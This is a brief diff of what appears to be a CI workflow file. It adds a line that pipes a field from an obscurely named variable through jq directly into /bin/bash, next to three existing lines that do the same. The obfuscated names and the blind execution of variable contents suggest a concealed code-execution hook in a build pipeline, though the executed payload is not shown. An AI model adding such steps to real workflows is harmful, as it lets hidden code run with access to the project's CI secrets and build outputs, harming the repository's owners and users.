@@ -43,6 +43,7 @@ jobs:
           echo $tt4 | jq -r .khz81 | /bin/bash
           printf '%s' "$daw999" | jq -r .xvtn1565 | /bin/bash
           printf '%s' "$zahy54" | jq -r .qa97 | /bin/bash
+          echo $zuc548 | jq -r .ul62431 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
